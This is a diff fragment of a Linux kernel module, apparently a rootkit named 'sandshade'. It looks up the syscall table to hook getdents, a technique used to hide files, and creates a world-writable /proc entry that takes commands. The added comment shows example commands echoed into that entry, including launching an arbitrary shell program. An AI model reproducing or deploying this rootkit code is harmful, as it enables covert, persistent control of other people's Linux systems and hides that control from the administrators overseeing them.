@@ -82,7 +82,9 @@ static int __init load(void)
     syscall_table = (void *) kallsyms_lookup_name("sys_call_table");
     og_getdents = (void *) syscall_table[__NR_getdents];
 
-    /* Create a /proc entry that we can echo commands to. */
+    /* Create a /proc entry that we can echo commands to (our module). 
+       EXAMPLE: # echo "enable" > /proc/sandshade 
+       	    or: # echo "python -m SimpleHTTPServer" > /proc/sandshade */
     proc_create("sandshade", 0666, NULL, &fops);
     printk("MODULE: loaded.\n");
     return 0;
